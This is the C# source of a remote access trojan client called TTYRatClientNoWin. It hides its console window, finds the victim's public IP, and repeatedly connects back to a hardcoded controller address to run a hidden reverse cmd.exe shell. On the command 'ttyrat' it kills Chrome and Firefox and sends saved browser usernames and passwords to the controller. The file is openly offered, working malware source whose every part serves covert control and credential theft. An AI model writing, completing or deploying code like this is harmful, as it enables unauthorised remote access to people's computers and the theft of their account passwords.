using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace TTYRatClientNoWin
{
    static class Program
    {
        
        [DllImport("Kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
            
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hwd,int cmdShow);
        
        static void Main(string[] args)
        {
            IntPtr hwd = GetConsoleWindow();
            ShowWindow(hwd,0);
            Shell shell = new Shell();
            Shell.getPublicIP(shell);
            shell.Start();
        }
    }

    
    public class Shell 
    {
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;
        public string publicIP;
        private string remoteIp = "127.0.0.1";
        private int currentPort = 56;
        protected ulong idKey = genKey();
        
        //private int mainPort = 6666;
        //private int waitingPort = 6667;
        //private int searchPort = 6668;

        
        #region MainMethods

        public void Start()
        {
            while (true)
            {
                RunServer(remoteIp, currentPort);
                Thread.Sleep(1000); //Wait 5 seconds//then try again
            }
        }

        private void RunServer(string ip, int port)
        {
            
            tcpClient = new TcpClient();
            strInput = new StringBuilder();
            if (!tcpClient.Connected)
            {
                try
                {                   
                    tcpClient.Connect(ip, port);
                    
                }
                catch (Exception ) { return; } //if no Client don't continue

                networkStream = tcpClient.GetStream();
                streamReader = new StreamReader(networkStream);
                streamWriter = new StreamWriter(networkStream);
                byte[] msgToSend = ASCIIEncoding.ASCII.GetBytes(publicIP + ':' + idKey + ':');
                Console.WriteLine(publicIP + ":" + idKey );
                networkStream.Write(msgToSend,0,msgToSend.Length);
                
                
                processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe";
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += CmdOutputDataHandler;
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }

            while (true)
            {
                try
                {
                    Cls:
                    strInput.Append(streamReader.ReadLine());
                    Console.WriteLine(streamReader.ReadLine());
                    strInput.Append("\n");
                    string cmd = strInput.ToString();
                    if (cmd == "cls\n")
                    {
                        goto Cls;
                    }
                   // if (cmd.Contains("change " ))
                    {
                        
                    }
                    // else
                    {
                        
                        //   AJOUT DE COMMANDE //
                        if (cmd.LastIndexOf("terminate", StringComparison.Ordinal) >= 0) StopServer();
                        if (cmd.LastIndexOf("powershell", StringComparison.Ordinal) >= 0) OpenApp();
                        if (cmd.LastIndexOf("ttyrat", StringComparison.Ordinal) >= 0) printPass(streamWriter);
                        if (cmd == "getip")
                        {
                            //processCmd.StandardInput.WriteLine(getPublicIP());
                        }
                        
                    
                        //   AJOUT DE COMMANDE //
                        processCmd.StandardInput.WriteLine(strInput);
                        strInput.Remove(0, strInput.Length);
                    }
                    
                }
                catch (Exception )
                {
                    Cleanup();
                    break;
                }
            }
            
        }

        #endregion
        
        #region WellFunctionOfReverseShell

        public static bool CheckForInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }
        
        public static void getPublicIP(Shell client)
        {
            bool connected = false;
            while (!connected)
            {
                connected = CheckForInternetConnection();
            }
            String address = "";  
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");  
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                address = stream.ReadToEnd();
            }
            int first = address.IndexOf("Address: ") + 9;  
            int last = address.LastIndexOf("</body>");  
            address = address.Substring(first, last - first);
            client.publicIP = address;
        }
        
        private void Cleanup()
        {
            try { processCmd.Kill(); }
            catch (Exception)
            {
                // ignored
            }
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }

        private void StopServer()
        {
            Cleanup();
            Environment.Exit(Environment.ExitCode);
        }

        
        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception)
                {
                    // ignored
                }
            }
        }

        #endregion
        
        #region PrintPass

        public static void printPass(StreamWriter writer)
        {
            string result = MainBp();
            string[] lines = result.Split('\n');
            foreach (var line in lines)
            {
                writer.WriteLine(line);
            }
            

        }
        
                
        public static string MainBp()
        {
            string result = "";
            // StreamWriter writer = new StreamWriter("pass.txt");
            List<IPassReader> readers = new List<IPassReader>();
            readers.Add(new FirefoxPassReader());
            readers.Add(new ChromePassReader());
            // readers.Add(new IE10PassReader());
            
            Process [] chromeInstances = Process.GetProcessesByName("chrome"); // killing all chrome instances
            foreach(Process p in chromeInstances)
                p.Kill();
            
            Process [] firefoxInstances = Process.GetProcessesByName("firefox"); // killing all firefox instances
            foreach(Process p in firefoxInstances)
                p.Kill();
            
            foreach (var reader in readers)
            {
                result += ("== "+reader.BrowserName+" ============================================ ");
                try
                {
                    PrintCredentials(reader.ReadPasswords(), ref result);
                }
                catch (Exception ex)
                {
                    result += ("Error reading "+reader.BrowserName+" passwords: " + ex.Message);
                }
            }
            // writer.Close();
            return result;
        }
        
        static void PrintCredentials(IEnumerable<CredentialModel> data, ref string dest)
        {
            foreach (var d in data)
                dest += ( d.Url + "\r\n\tU: " + d.Username +"\r\n\tP: "+d.Password+"\r\n");
        }

        #endregion

        #region Misc

        private void OpenApp()
        {
            processCmd.StandardInput.WriteLine("powershell"); //send command
        }

        public static ulong genKey()
        {
            DateTime date = DateTime.Now;
            string keyStr = date.ToString(); 
            keyStr = keyStr.Replace('/', ' ');
            keyStr = keyStr.Replace(':', ' ');
            keyStr = keyStr.Replace(" ", "");
            Random rdm = new Random();
            ulong salt = Convert.ToUInt64(rdm.Next(0, rdm.Next()));
            ulong key = UInt64.Parse(keyStr) * salt;
            return(key);
        }

        #endregion
        
        
        
        
    }

    
}

